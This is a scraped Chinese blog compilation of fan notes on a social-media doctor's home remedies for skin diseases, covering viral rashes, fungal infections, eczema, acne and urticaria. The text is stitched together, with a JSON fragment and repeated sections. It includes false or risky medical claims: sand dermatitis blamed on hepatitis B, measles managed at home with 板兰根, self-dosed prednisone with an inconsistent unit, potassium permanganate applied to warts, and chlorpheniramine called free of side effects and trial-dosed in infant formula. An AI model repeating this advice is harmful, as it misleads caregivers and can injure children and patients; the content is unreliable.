二、麻疹\n\n五岁以上多发，开春易得，前期症状是中高热38、39度，烧3、4天，烧退之后出疹，从头上发际开始长，一片一片的，嘴里有发蓝灰色的小泡。孩子只要精神头儿好就没事，不用去医院，如果没有特别重的症状，顶多吃点抗病毒药板兰根，大点的孩子吃大半包，小点的孩子吃小半包，一天三次，板兰根是确定有病毒抑制作用的中药，利巴韦林、阿西洛韦等这类药意义不大，只能起到干扰病毒繁殖的作用，无法完全杀死病毒。麻疹属于自限性疾病，两到三周就好了。\n\n# 三、风疹\n\n又称德国麻疹，它的症状与麻疹很像，比麻疹轻一点点，先是中低热，疹子起的也比麻疹轻一点、小一点，疹子退的也比麻疹快一些。\n\n# 四、水痘\n\n和手足口病很像，但这两种病不是一族的，水痘是由水痘带状疱疹病毒引起的，两种痘的形态很像，手足口的泡长在手心、脚心、嘴里，水痘主要在脸上。症状是先有发烧等和感冒相似的症状，但症状轻，几天后出疹，也不建议服用利巴韦林、阿西洛韦等抗病毒药，喝点板兰根就行，一定要吃抗组胺药止痒，一天3次，药量掌握在压住不痒就可以，水痘在鼓硬泡的时候最痒，一旦挠破了就会留疤，吃药止痒孩子就不会挠，抹上龙胆紫或碘伏，让它收敛变干、4、5天就干掉，再过4、5天就会脱落。\n\n如果孩子烧退了还是没精神有可能病毒入脑，一定要去医院。\n\n成人和小孩的治疗方法一样。\n\n# 五、带状疱疹\n\n发病多见于成人，小时候得过水痘的很少会得带状疱疹，水痘和带状疱疹都是由水痘带状疱疹病毒引起的，刚开始这种病毒潜伏在脊柱里，人在劳累、着急时易发病，病毒顺着神经跑出来，一般只长在身体的一边，成簇状分布在前胸后背，20岁左右的得了问题不大，四十岁以上的要注意，特别是60岁以上的，会非常痛苦。因为这种病毒不但侵犯神经，还破坏神经鞘，神经鞘一旦被破坏，恢复的时候就会箍紧神经，二周多后造成愈后神经痛。\n\n预防愈后神经痛的方法是从水泡出来算起，7天内开始服用强的松片（无高血压、糖尿病的情况下），每天早上吃一次，一次15毫克（3片），连吃7天后停掉，愈后一点问题都没有。发病期间可以吃止疼药，外用炉干石，龙胆紫，黄连素水都可以，但那都是次要的，它也属于自限性疾病，过段时间就会好。\n\n病人有糖尿病、高血压的建议在医生指导下用药，其实强的松对糖尿病、高血压病人的影响是有限的。\n\n# 六、传染性软疣\n\n不分季节发病，治疗不彻底的例子很多，它是由痘病毒引起的，这种病毒在自然界中很少见。但它具有传染性，必须要夹掉。它和水痘的区别是水痘是亮的，它是白了，如芝麻、针尖大小，表面发平，中间有个脐窝，后背、四肢上端多发，符合以上特征基本可以确诊。\n\n治疗方法是1、用镊子夹掉，或先用针挑破再用摄子把白心挤掉，最后用碘伏擦。只要发现就要及时全部清掉，千万别耽误。第一次清完，后面两周可能还会出，因为还有藏在下面没有发出来的，只要出来就继续去处理掉，一般三周下来，就不会再出了；2、防止病毒种植回来。每周要烫洗被褥和内衣、毛巾等，全家的都要烫洗。烫洗的方法是每周一次将衣物、床品放在一个大盆里，用开水浇进去，放凉了之后再放洗衣机洗。用84、酒精都不行。\n\n不用担心留疤问题，因为没有侵犯到真皮层；碘伏也不会留下色素沉着，有时可能会有表皮的着色，过一段就消失了。\n\n# 七、沙土性皮炎\n\n孩子玩沙土或在垫子上爬完之后，多发于手脖、脚脖上和皮肤颜色差不多的散在的一个个微微隆起，这是由乙肝病毒引起的。治疗方法是吃板兰根，局部不需要过多处理，可以抹碘伏，2-3周就好了。\n\n# 八、扁平疣\n\n如芝麻、针尖大小，一般不超过绿豆大，表面平平的，发乌发暗，扁平疣是由HPV3、8、10型引起的，皮肤上的病毒免疫细胞是杀不了的，但它是暴露在皮肤上面，所以用碘\n\n伏，小孩用碘伏有效率在一半以上，因为小孩角质层只有7-8层，比较薄，碘伏渗进去直接就把病毒杀死了，成人的角质有15层左右，需要把表皮打薄，可以用乌鱼骨磨薄，每天抹3-5次碘伏，成人有效率在三分之一，当快好的时候会有点痒，80%-90%，快好时有红肿，接着抹就可以，但是注意眼周的别用，因为眼周的皮肤比较娇嫩，容易引起刺激反应。\n\n上面方法无效的或眼周的只能用激光去做掉，还有一些抹五氟尿嘧啶或鸭胆子，但是它们是强腐蚀性，易形成坑。\n\n# 九、寻常疣（刺猴）\n\n用碘伏的有效率不到10%，因为它太厚了，碘伏渗不进去，建议用激光打掉，但两个地方的不建议用激光，一个是指甲旁边的（甲旁疣）和脚底的（跖疣），甲旁疣用激光会影响指甲，跖疣用激光会影响走路且易感染。建议用鸡眼膏，在鸡眼膏中间的红色水杨酸上放一粒高锰酸钾，24小时换一次，一天下来，就会变黑，只用两天，基本就够了，时间长了会腐蚀皮肤成坑，千万别贪快，皮肤嫩的用一天就停，如果不彻底，过几天再用一个阶段，一定掌握分寸。\n\n# 十、单纯性疱疹\n\n俗称火燎泡，是由病毒引起，在脑子里的神经结潜伏，感冒发烧后易发病，因为免疫细胞进不了神经结，不能根治，呈黄白色，形成的痂是棕色的。治疗方法及注意事项：一是不要继发细菌感染，用红霉素、金霉素软膏涂沫；二是别亲孩子，会传染；三是小孩得了可能会入脑，表现为头疼，没精神，要及时去医院。\n\n\n# 真菌类\n\n# 一、头癣\n\n表现为掉头发，有的贴着根断，头皮能看到头发根的黑点，有的会留一点头发茬，这两种情况都是头癣。治疗方法：不需要“坐等还书”，因为头皮角质层长的特别快，一般的“坐等还书”进不来，效果差；用碘伏抹比什么都好使，而碘伏顺着角质层向下渗，杀死真菌，真菌的孢子虽然带硬壳，碘伏对它也有效，只是需要时间长一点。\n\n注意头癣与斑秃的区别，斑秃的头皮是光的，看不到头发茬，小孩得了斑秃不用管，那是毛囊休眠了，三个月就长出来了。\n\n有些人触类旁通，用碘伏治猫癣、狗癣，因为同样是真菌类的病，所以也一样有效。\n\n# 二、脚气是否可以有碘伏\n\n碘伏可以杀死细菌、病毒、真菌，那么脚气可以用碘伏吗？不是完全不可以，只是有一点要注意：长时间用，怕皮肤受不了，产生刺激损伤，头上能用是因为头上的角质层厚。鹤叔推荐的原则首先是安全，其次是有效。\n\n# 三、汗斑、花斑癣、股癣、体癣\n\n汗斑、花斑癣多见于前胸后背，有的发红、紫，有的发黄、灰色，有点白沫沫，呈一粒粒的，像金钱豹的花纹；体\n\n癣呈地图样，中心的颜色和正常肤色一样；股癣是脚上真菌穿裤子时，脚蹬到裆部再种植到大腿根儿造成的；治疗方法都用“坐等还书”，用碘伏不是不可以，但是怕刺激皮肤，注意股癣不要用碘伏，因为裆部容易磨擦会使皮肤损伤。除了用药以外，还需要烫洗可能接触真菌部位的衣服和床品，每周一次。\n\n\n# 损伤类\n\n# 一、激素脸敷脸过程中出现的问题\n\n1、敷过十几天后是不是可以开始化妆？不可以，因为这时皮肤基底层并没有真正恢复，少于三个月，根本修复不了，这是皮肤结构决定的。三个月后即使修复，其稳定性也很差，因为免疫系统还记得这个事，因此易复发。所以先黄连素水湿敷三个月，之后不用湿敷了，但是要记得抹婴儿润肤霜，再过三个月。以上两个阶段，都不能化妆。\n\n2、敷十几二十天后出现反跳。表现为干、抹润肤霜后出现刺痛。原因分析：以前肌底层有炎症，负责防守的细胞在肌底层聚集，黄连素杀菌、收敛，毛细血管收缩，上面的表皮开始生长，防守的细胞撤退，出现空窗期。这时表面有刺激就出现下面的反应，出现疼痛，毛细血管又扩张，出现了红血丝，本来抹润肤霜不疼的，现在又疼了，这属于正常现象。解决方法是将黄连素水的浓度降低（如5片改为1片），如果不疼了就用稀释的，如果还是疼，就用清水（或纯净水），这样减少刺激1-2周后换回到标准的黄连素水，就不疼了，因为这时皮肤已经彻底变厚了。\n\n3、儿童的红血丝不需要处理，因为儿童的角质本来就特别薄，所以能看见里面的毛细血管很正常，并且胎儿时期，为保证今后发育会储备和囤积很多的毛细血管。\n\n# 二、唇炎\n\n成人的唇炎多为手撕皮造成的，不要撕，抹开塞露和乐肤液1：1混合液。\n\n儿童唇炎造成的原因是擦嘴方法不正确。如用袖子会摩擦表皮；用湿纸巾会带走油脂，使角质受损更快更刺激；用软的纸擦也不行，因为小孩吃的菜汤沾在皮肤上，把皮肤泡脆了，纸擦后出现微小裂口，盐份会刺激。应该先用清水洗，再用干毛巾沾干，最后抹上开塞露和乐肤液1：1的混合液抹在唇炎处，如果感觉抹上疼，就只抹开塞露，开塞露里面的硫酸镁是苦的，防止孩子舔，甘油成分也能帮助唇炎恢复，两周左右就好了。\n\n日光性唇炎多发于下嘴唇，是由日光照射引起的，可使用上面同样的方法治疗。\n\n乐肤液是激素类的药物，只可短期使用，好了之后就不用抹混合液了，日常抹凡士林保护皮肤。\n\n# 三、肛周湿疹\n\n肛周和口周的结构一样，皮肤和粘膜的过度区称为栉膜，很薄，所以肛周湿疹和唇炎是一样的治疗方法，用开塞露和乐肤液1：1混合抹，嫌油的可以换成艾洛松和凡士林1：1。\n\n有人疑问激素类药膏能长期使用吗？完全不用担心，两周就好了，根本不需要长期用，碘伏也是同样道理，人的皮肤展开有两平米，不是全身刷，哪需要抹哪，不存在长期使用。\n\n注意：1、很多病与卫生习惯有关，平时要给孩子一天两次清洗会阴和肛周等私处，防止出现湿疹和脓肿；2、避免吃辣的，因为会刺激肠道，加强肠蠕动，分泌肠液刺激肛周，易引发湿疹。\n\n# 四、倒刺\n\n又称逆剥，疫情期间总洗手会导致起手背糙、倒刺，倒刺不要撕，要将其剪掉，每次洗完手抹上护手霜，如果用凡士林代替护手霜更好。\n\n# 五、手脚干裂\n\n手脚干裂是平时烫、磨、刮，刺激皮肤，造成表皮增厚皲裂，要避免这些行为，抹尿素霜软化，之后厚皮会一点点脱落，一两个月之后就光滑了。注意爆皮后让他自然脱落，不要人为撕剪。\n\n# 六、人工性皮炎（角化性湿疹、肥厚性湿疹）\n\n皮肤痒就要吃药止痒，同时管住手，死皮不要撕、剪，\n\n治疗过程中会有死皮翘起来，也不要动它，一点点自己掉了就好了。这些人为撕皮造成的皮炎属于人工性皮炎，道理和手脚干裂一样，治疗方法也一样。\n\n# 七、肛裂\n\n有的是表皮的裂，有的到了真皮、皮下，分不清是哪种的，都用碘伏，只要不感染就能长好。\n\n\n# 毛孔、汗腺\n\n# 一、汗疱疹\n\n一般长在手指侧面，呈小水泡状。多见的发病人群：1、护士；2、出汗多的人；3、游泳的人；4、饭店洗盘子的人。原因是经常洗手把表皮角质层洗塌了或被汗、水泡塌了，汗出不来，皮脂腺顶出了小包，水份被吸收了，盐份在那刺激，就会痒。如果治疗方法不对，别挤别撕，会损伤真皮层成湿疹，红、肿、痒。鹤叔推荐：用乐肤液（哈西奈德溶液）涂抹，切记不要买成乐肤杀菌液。\n\n# 二、毛周角化症\n\n把表面的硬尖抠掉，里面盘着一根小毛发。抹尿素霜可以抑制角化，可明显减轻，但这种病是基因病，去不了根儿，如果红肿，可以用艾洛松和尿素霜1：1混合涂沫。\n\n# 三、痤疮\n\n分为鼻区、口周区、额区、面颊区。各区发病机理不同。\n\n鼻区最简单：一般是蠕形螨引起的，先抹碘伏、干了之后抹硫磺软膏，碘伏杀里面的，它跑出来之后，硫磺软膏在外面杀，一天2-3次，很容易治好，已经变成酒糟鼻的斑痕是恢复不了的。\n\n第二好治的是颊区，细菌感染导致，前胸后背等同于面颊部的发病原理。手摸，抓痒也会让细菌种植。可用碘伏杀菌，晚上睡前吃一次抗组胺药，如半片扑尔敏或开瑞坦，烫洗床品防止种植。\n\n第三是口周的痤疮，一般跟肠道内毒素太高有关，所以忌吃辣椒，调整肠胃，每天至少排便一次。\n\n第四是额区的，是由于雄性激素水平升高导致的，雄性激素会使表皮增厚，堵塞毛囊，青少年多运动把雄性激素消耗掉，成年人要把生活、工作问题解决好，不推荐自己服抗雄激素的药，因为自己掌握不好量，乱用会伤身体。\n\n除了以上的注意事项和解决方法外，四区都可遵循白头、黑头用十滴水洗，红头、脓头用碘伏抹的原则治疗。\n\n十滴水洗脸方法：一盆温热水加半支约2.5毫升的十滴水洗脸，之后用中性洗面奶搓一分钟，不喜欢味道的可以最后用温热的清水冲洗，毛巾擦干，洗完脸会干，一定要抹润肤露。十滴水有清热开窍的功效，可帮助打开毛囊口，虽然里面含有辣椒和酒精，但是已经被我们稀释了一千倍，不会刺激。\n\n# 四、痱子\n\n痱子根据轻重程度分为白痱、红痱、深痱、脓痱。出的汗（盐水）往上冒形马白点，叫白痱；多一些汗出不来横向两边撑开毛囊，形成红头，叫红痱；再重一点向下漫延有脓叫脓痱；再继续向下发展成深痱。治疗方法是白痱用标准黄连素水，一天5次抹或湿敷15-20分钟，一天3次，也可以用十滴水半支放在一大盆湿热水中给孩子洗澡，2-3天消褪；红痱用标准黄连素水+5毫升乐肤液，一天3次湿敷，2-3天消褪；脓痱标准黄连素水加5毫升碘伏（严重的10毫升）和5毫升乐肤液，一天3次温敷，4-5天消褪；深痱用脓痱的方法也可以治，碘伏、乐肤液比例可酌情增加。\n\n\n# 其他\n\n# 一、牛皮癣\n\n牛皮癣有以下特征。1、是一种基因病：由基因决定的，不能根治；2、是一种环境病：有的患者经常处于湿润的环境，换到干燥的环境生活，或是原本在干燥的环境，换到湿润的环境中，就好了，有条件的人可以换一下环境试试；3、是一种情绪病:牛皮癣的患者多数性格急燥，风风火火，试着控制一下情绪，说话做事要慢慢来；4、是一种谱性病，有这种基因的人之中，一部分人一生只发一两次，抹一些药\n\n膏就不再犯了；还有一部分人只是散在的几处，发作时抹一点药，不影响正常生活，也不必太在意；这些人占70%以上。只有极少的人存在红、肿、脓等严重的问题。不要相信哪个医院或医生能彻底治愈，治疗牛皮癣有成熟的治疗方法，都写进了书里，不要乱用药，不然可能会导致本来是70%里面轻症的，演变成重症。\n\n# 二、血管瘤\n\n小小孩的血管瘤，分单纯型和海绵型，一般从出生几个月后开始长出，单纯型的表面光滑、发亮，与小孩同比例增长，不用管它，到过了青春期再处理；海绵型的是突起的，有毛囊窝，表面不反光，会超速生长，要及时做掉。还有一种交界混合型，也要及早治。\n\n# 三、孩子头上起大面积白屑\n\n以下几种情况根据症状判断是什么病：\n\n1、真菌感染：头发大片起白沫，头发会折，不管是贴跟折的，还是长一点点折的，就是头癣，真菌，抹脚气膏，用“坐等还书”方法治疗。\n\n2、毛发红糠疹：头发没折，没办法治，基因病。\n\n3、银屑病：有束状发，就是头发一束束的，这里不讲，内容太多。\n\n4、头皮屑：洗发水里加碘伏或洁尔阴。\n\n# 四、特异性湿疹\n\n也叫慢性皮炎，这种病是经历了五个环节：1、一次刺激，可能是蚊虫叮咬或吃了、接触了导致过敏的东西，皮肤出现皮疹，只要有皮疹，细胞就会报警，产生组胺；2、如果产生组胺量多，没有及时分解，组胺会入血；3、组胺渗出血管，引发别处的痒；4、表皮挠裂，造成新的皮疹，细胞又报警，又产生组胺；5、恶性循环1-4步，皮疹越来越多，痒越来越重，激活了体内免疫系统，免疫系统产生记忆。这也是为什么很多孩子治疗中出现反跳的原因。\n\n治疗方法：孩子的免疫系统是个半成品，细胞更新快，只需要半年时间，只要半年内不出现恶性循环，等免疫细胞更新完，病就彻底好了。所以在1-2步之间下手治疗最好，外用抹药效果不好，口服药抗组胺才是根本，抗组胺药有：扑尔敏、开瑞坦、息斯敏等，其中鹤叔推荐扑尔敏，优点是安全，在药典中扑尔敏没有不良反应。用法是：试着用。最小的孩子用四分之一片，重的用三分之一片，加到奶粉里，只要不痒了就说明组胺被中和掉了，最严重的从一片开始试服，根据是否止痒来加减药量，找到刚刚好不痒的量，再加一点点，稳定一周左右，开始逐渐减药量，减药量遵循先减中午量，再减上午量，最后减下午量的原则，吃一片的可以到减到四分之三片、再到四分之二、再到四分之一；也可以根据哪个时间段痒的严重的，哪个时段最后减的原则。一旦出现反弹，再把药量加一点点，2-4天后再减量。一般2个\n\n月之内可以减到停药；最严重的，3个月能达到停药。外抹的可以用带“松”字的药膏单独或加凡士林1：1混合抹，很多孩子不用外用药只靠口服药就治好了。\n\n它难治是因为第5步反复的恶性循环，要至少维持孩子半年以上不痒，免疫细胞完全更新后，就彻底脱敏了。大人的免疫系统是成品，更新的会慢很多，需要的时间也更长。\n\n# 五、荨麻疹\n\n荨麻疹种类很多。\n\n干燥型荨麻疹：晚上进被窝就痒，一挠起大疙瘩，半小时内消退掉，是典型的干燥型荨麻疹，用润肤露给它盖上就不发病了，不用吃药。\n\n假性荨麻疹：不是因为对食物过敏，而是短时间吃肉太多，孩子脾胃功能弱，没有把蛋白质完全吸收，所以有一部分入血，所以过节给孩子吃肉少一点慢一点。\n\n寒冷性荨麻疹：冷的时候发作，冬天不必说，夏天下雨，进空调间，所有变冷的环境下发出来的，都有可能是寒冷性荨麻疹。皮肤出现一片一片的风团，很有可能会导致憋死，甚至引起心脏的反应。寒冷性荨麻疹本质就是胆碱性荨麻疹，是体内分泌的胆碱太多造成的。治疗可服赛庚啶片，早中晚各吃一次，药量自己掌握，半片或是一片，那这个药量就可以，要吃几天，不起风团了，或是明显减轻了，那药量太大了。吃药期间不要开车，有一半的人用它治疗胆碱性能荨麻\n\n疹是管用的。\n\n荨麻疹一半以上和饮食有关：病例：发的时间都在晚上，晚上不容易接触花粉，也不容易接触尘螨，为什么在这时候过敏呢，分析可能是和吃有关，晚上尽量少吃，而且不要碰大鱼大肉，这样坚持三天，三天后就没有再发了，分析其根本原因是脾胃功能弱，晚上不消化。\n\n光是起一大堆的风团吃点抗组胺的药，外用炉甘石洗剂。如果有憋着上不来气，心慌，赶快去医院！这是荨麻疹出现了喉头水肿，声带和心脏这些都是会起荨麻疹的，这是第一急疹，一定要去医院。\n\n\n# 注解\n\n“坐等还书”：1、“坐（唑）”是一大类，所以叫“唑等“，如达克宁、孚琪、克霉唑，化学名里都有个“唑”，2、“还”是环利软膏，它是合成药类（环丙酮胺）；3、“书”是指丙烯胺类的药物-特比萘芬，别管叫兰美抒、疗霉舒，后面一定有个舒（抒）字，这几种药每个用两三周，轮着换，可以把一些产生耐药性的真菌都杀死（使用顺序唑、环、另一种唑、舒）。\n\n十滴水：中药，有清热开窍的功效，原本是用于防中暑的内服药，和藿香正气水一类，但不能用藿香正气水带替十滴水。\n\n碘伏：医用碘伏，浓度为1%，市面难买到，一般药店的浓度偏低会降低药效，浓度太高容易烧伤皮肤。\n\n开塞露：原本是治疗便秘的外用药，含甘油。\n\n乐肤液：哈西奈德溶液，不要买成乐肤杀菌液。\n\n黄连素：盐酸小檗碱片。\n\n标准黄连素水：5片黄连素（盐酸小檗碱片）磨碎，加入500毫升水中，不需要加热。\n\n凡士林：无添加的凡士林，首选贝亲凡士林。\n\n甲硝锉、高锰酸钾：都是指的片剂。\n\n烫洗：为防止影响治疗治疗效果，对可能细菌、病毒种植的衣物、床品进行处理，方法是将衣物、床品放在大盆里，用开水浇上，等凉后再放洗衣机正常洗涤，频次为一周一次。\n\n抗组胺药：是一大类药，有很多种，常见的有扑尔敏、开瑞坦、西替利嗪等，其中扑尔敏最便宜，且在药典中没有明确的不良反应，相对安全，是鹤叔推荐使用的，但吃完后会困，不能开车，如吃完药需开车，可以选择开瑞坦。\n\n提醒：以上为 鹤粉-灯火阑珊 的个人笔记，整理过程中不免有疏漏和错误，因此只可参考，不作为疾病的诊断和治疗依据。",normalizedContent:"# 鹤叔医疗科普合集\n\n> 博主有话说：本人于2020年7月27日将《鹤叔医疗科普合集》搬到自己博客上了。以下内容只加了适当标题编号，没有对其他内容进行修改，是医学科普，仅供参考！科普作者可以搜微信公众号“仙鹤大叔张文鹤”，抖音是仙鹤大叔。\n\n\n# 写在前面\n\n（20200221）灯火阑珊 整\n\n整理者按：2019年10月份，一个偶然的机会通过抖音关注了鹤叔，他教我们通过最简单的方式，使用最便宜、易得的药物来解决常见的皮肤问题。不仅告诉我们治疗的方法，还解析了疾病的发病原理，使我们解除了痛苦，甚至治愈了很多久拖不愈的疑难杂症。鹤叔说他做科普一不为名，二不图利，就是希望老百姓多些知识的储备，少些后悔。通过鹤叔的科普，越来越多的人自己在家就解决了原本四处求医都不见好转的皮肤问题。\n\n杏林春满，医者仁心。鹤叔的科普如星星之火，以燎原之势在造福更多的百姓。希望我的整理稿，如一阵清风，带着这星火传递给更多有缘人。\n\n感恩鹤叔的无私科普，感谢鹤粉-壮壮的校对和查漏补缺！\n\n\n# 第一篇：抖音短视频科普集锦(20200221)\n\n 1.  鹤叔讲课一不为名，二不图利，希望老百姓少后悔：80多岁老人得带状疱疹听人说激素有危害，不用，过了治疗期疼得拿头撞墙，生不如死；十几岁的小孩激光治了跖疣不懂预防感染，差点截肢；漂亮女孩乱用化妆品，过敏后乱抹激素闹成激素依赖性皮炎。这类事触目惊心，就因为老百姓脑子里头没有这些知识储备。\n\n 2.  面部湿疹：夏天抱孩子不得当，宝宝的口水和大人的汗水混合会对宝宝的细嫩皮肤造成伤害，大人皮肤上的细菌也趁机入侵孩子的面部，接触部位不通风，刺激和细菌很容易造成面部湿疹。解决方法：在大人的肩膀放一块干净的手巾，孩子的脸贴在手巾上，既通风又吸收汗液和口水，避免细菌入侵。\n\n 3.  小儿湿疹：具备三只眼，第一只眼准确看清小孩体内毒素的眼，为什么皮肤不停出皮疹，本质是体内的毒素，其实就是一种神经介质，如果你不知道它的量就不知道用药到什么程度可以把它中和掉，不去根，所以病就要反复发；第二只眼看清皮疹的深度，深的用药强一些，浅的用药浅一些，因为外用药有副作用；第三只眼看清孩子生活中的哪些危险因素，及时避开，及时用药。这三只眼教不了你，只能来找医生看。\n\n 4.  小儿肛周湿疹：标准黄连素水加10毫升乐肤液，中午或晚上睡觉的时候用小手巾蘸着混合液夹在孩子的屁屁里，保持半个小时，早上和下午再用混合液各抹一次，95%以上的孩子有三五天就可以彻底消退了。\n\n 5.  外耳道湿疹：小孩乱掏耳朵眼，掏得流脓淌水，痛痒不止怎么办？一支开塞露、一支乐肤液、再加两毫升碘伏混合，用棉签蘸着一天给他抹三回，在耳道内转一圈，三五天之内搞定。\n\n 6.  干燥型湿疹：一脱裤子抓小腿，一抓小腿掉白沫，抓久了皮肤增厚出白斑是典型的症状，用凡士林。\n\n 7.  幼儿的急性湿疹：有很强的规律性，夏初多数跟皮温过高有关，皮温高，出的汗多排不出来留在里边形成痱子，刺激周围产生急性湿疹；夏中和紫外线照射有关，孩子皮肤不耐受，出现急性湿疹；到夏末，跟饮食有关，经过夏天孩子脾胃功能弱，很多东西没有消化，进入体内，引起急性湿疹反应；入秋开春和皮肤干燥有关，因为气候干燥细胞间缺少粘合性，外界一刺激，形成肉眼看不见的裂口，外来物进去，引起湿疹反应。\n\n 8.  干性湿疹：特别是腿上，什么都没长，但干的掉沫，是典型的干性湿疹，抹润肤露就能解决。小孩干燥性湿疹病例：治疗效果不好，是由于大人搂着孩子睡，温度高，烤的干燥。建议让孩子在小床上单独睡，温度不要太高。\n\n 9.  被蜂蜇了：黄蜂蜇了抹醋因为它的毒液的碱性的，蜜蜂蜇了抹肥皂水。（蜜蜂与黄蜂的区别：蜜蜂只有黄蜂肚子那么大）\n\n 10. 水痘：冬天和春天多见。米粒儿到豌豆大小鼓鼓溜溜的小水泡，水疱周围一圈红晕，如果水疱中间出现一个像肚脐似的小窝，这个病基本就确诊了，得病前一般发烧，有的不烧，发病部位先从头顶脸上开始之后向躯干和四肢蔓延，这个病是自限性的，三到四周就好了，针对性的可以用板兰根抗病毒，抹一点紫药水防止感染，挠的厉害可以用点止痒药口服，小时候得水痘，长大就不得带状疱疹。\n\n 11. 水痘留疤问题：两种情况会留疤，一是感染，抹上龙胆紫溶液，收敛了就不感染了；二是抓破，一天三回吃上止痒药（如扑尔敏），不痒就不抓了。\n\n 12. 带状疱疹：第一，为什么强的松片能预防愈后神经痛？它相当于洗衣服时放的柔顺剂，柔顺剂使衣服缩水不那么厉害，强的松的作用是让神经鞘恢复时，箍着神经不那么紧，自然就不会神经疼了；第二，激素能不能用？激素是药不是毒药，在医生指导下合理用量，快上快下就是安全的；第三，糖尿病和高血压怎么办？在专科医生指导下使用这个方法；第四，每天吃15毫克多不多？不多，书上写的是40-60毫克，但是临床发现15毫克就够了；第五，发病超过两周之后这个方法还管不管用？没用了。强的松的吃法是每次15毫升，连吃7天。\n\n 13. 毛囊炎、疖肿、汗腺炎、甲沟炎:一瓶碘伏搞定。\n\n 14. 斑痕疙瘩：肤疾宁贴膏（曲安奈德新霉素贴膏），对将近一半斑痕疙瘩管用，把贴膏剪开比疙瘩大一点贴上，24小时换一次，如果一个月之内变软，没有疼痒或长新疙瘩，多数在两一个月变好，连用三个月可以彻底搞定。这个治疗法和斑痕疙瘩的时间长短没关系，只看你的体质接受不接受。\n\n 15. 荨麻疹：种类很多，一半以上和饮食有关。病例：发的时间都在晚上，晚上不容易接触花粉，也不容易接触尘螨，为什么在这时候过敏呢，分析可能是和吃有关，晚上尽量少吃，而且不要碰大鱼大肉，这样坚持三天，三天后就没有再发了，分析其根本原因是脾胃功能弱，晚上不消化。\n     \n     * 干燥型荨麻疹：晚上进被窝就痒，一挠起大疙瘩，半小时内消退掉，是典型的干燥型荨麻疹，用润肤露给它盖上就不发病了不用吃药。\n     * 假性荨麻疹：不是因为对食物过敏，而是短时间吃肉太多，孩子脾胃功能弱，没有把蛋白质完全吸收，所以有一部分入血，所以过节给孩子吃肉少一点慢一点。\n\n 16. 扁平疣：一是用碘伏，一天五次，连抹一个月，3分之一就下去了；二是抹了150次才把它治下去值不值？用激光很快，一次会彻底干净，但又疼又留疤，怎么选择自己看；三是为什么只有三分之一？因为这是临床数据，去医院之前有三分之一概率能治好，要不要选择自已决定；第四，成人用药之前要把扁平疣泡软磨薄会不会造成新的传染？把碘伏抹的范围扩大新病毒就杀死了；第五，脸上、眼皮上的能不能用，只要不抹到眼睛里都可以；第六，碘伏抹完会不会色素沉着：放心，不会。扁平疣主要就是hpv病毒3、8、10型引起的，对碘剂敏感。大人表皮比较厚需要泡软磨薄后抹。\n\n 17. 汗管瘤：预防只有半个办法：中药里面有凉血功效的方子，似乎管用。治疗有一个半办法：一个办法是用激光或电解这种热疗把它做掉，半个办法是：有报道称，一些抗病毒的药水或药膏似乎管用，可以试一下。\n\n 18. 脸上的汗管瘤和扁平疣有三点不同：第一扁平疣是病毒感染，汗管瘤是良性皮肤肿瘤；第二扁平疣表面发乌，汗管瘤表面有蜡样光泽；第三扁平疣鹤叔有绝招，汗管瘤没有。\n\n 19. 脚气、股癣、体癣、汗斑：为什么顽固，就像除草剂用久了，草会产生搞药性就不管用了，所以一定要把不同的脚气膏轮换着用，记住口决：“坐等还书”。“坐（唑）”是一大类，所以叫“唑等“，如达克宁、孚琪、克霉唑，化学名里都有个“唑”，“还”是环利软膏，它是合成药类（环丙酮胺），“舒”是指丙烯胺类的药物，特比萘芬，别管叫兰美抒、疗霉舒，后面一定有个舒（抒）字，这几种药每个用两三周，轮着换，可以把一些产生耐药性的真菌都杀死。\n\n 20. 寻常疣和丝状疣：寻常疣是刺猴，长在脚底板叫跖疣，长在指甲旁连叫甲旁疣，这两种疣不好治。长在脖子上一般容易长成丝状疣或指状疣，治起来比较简单，把它用电刀、激光烧掉，根部小，基本不留疤，它跟皮赘分不清做掉都是没错的。\n\n 21. 跖疣和鸡眼怎么区分：把表皮削掉，如果有密集的小点就是跖疣。\n\n 22. 倒刺：就是干出来的，把它剪掉，用五块钱的护手霜抹上就可以了，别撕。\n\n 23. 玫瑰糠疹：第一，和病毒感染有关可以口服板蓝根；第二，外用一些炉甘石洗剂6-8周自己能好；第三，不会留疤。\n\n 24. 孩子晒伤：半小时内做三件事，一是用手头一切凉的东西给皮肤降温；二是标准黄连素水冷湿敷；三是用去炎松或艾洛松薄薄抹一层。一多半可以不发日光疹。\n\n 25. 牛皮癣：到正规医院治疗，否则很危险，牛皮癣治疗有成熟的治疗方案，不能根治，是基因病，发病程度因人而宜，有百分之六十以上都不严重，不要自己瞎抹药，容易成严重的。\n\n 26. 小孩烂嘴角：开塞露和乐肤液1：1混合一天抹三回，一周好。开塞露是苦的，防止小孩舔，乐肤液起作用把它治好。\n\n 27. 口周皮炎：开塞露和乐肤液1：1混合，一天抹三回，这两个组合很合理，既能保湿又可以滋养还能够封包增强药效，便宜可靠有效。口服药可以用老药扑尔敏，一天三回。只针对较轻的比较管用。\n\n 28. 小孩盗汗：前半夜出汗，就像商店关门后店员盘点，累的出汗，是正常的，如果后半夜出汗，有可能是盗汗需要看一下。\n\n 29. 关于药物的副作用：就像毒虫，用好了可以以毒攻毒来治病，西药又何尝不是呢。\n\n 30. 痱子相关\n     \n     * 秋冬季节，孩子在运动或出汗的时候，后背出现某些针扎样的痛痒。皮肤正常，有鸡皮样的小疙瘩，99%是痱子。\n     * 痱子或痱子引起的湿疹：多是暖气房捂出来的，专家门诊一半以上是痱子或痱子引起的湿疹。标准黄连素水试用两天，实在不行再往医院抱。\n     * 家长质疑家里温度不高孩子怎么会得痱子：问你抱不抱孩子，答孩子总得抱，不然就闹。人体半小时产生的热量可以使半加仑水，也就是1.9升水沸腾，你想抱孩子时间长，孩子的皮温要上升多少？要控制的不是室温、气温，而是孩子的皮温。\n\n 31. 股癣：如果孩子的大腿根部最早是个红点，后来变成红斑，最后再扩大成地图样，边上高中间低，那基本上就是股癣了，治疗方法：一是勤换内裤，开水烫洗内衣；二是脚气和股癣同时治疗；三是“坐等还书”选三种药轮换使用。\n\n 32. 吃什么提高孩子皮肤免疫力：见风见雨见太阳，在自然界多锻炼，只要孩子能承受，不管对感染类还是过敏类疾病都有预防作用。\n\n 33. 碘伏会色素沉着吗：碘伏只进表皮不进真皮不会色素沉着。\n\n 34. 手足口病：家长一怕误诊，二怕后遗症，记住口决：除长在手足口部位之外，还有十个字：“个大”：一般的病毒疹是芝麻和针尖大，它是黄豆豌豆大；“数少”：别的一长一堆，它全身可能就50个；“抗病毒”：治疗起来用点板蓝根就可以把它治下去；“一周好”：7-10天自己就可以消退不留什么痕迹也不复发。\n\n 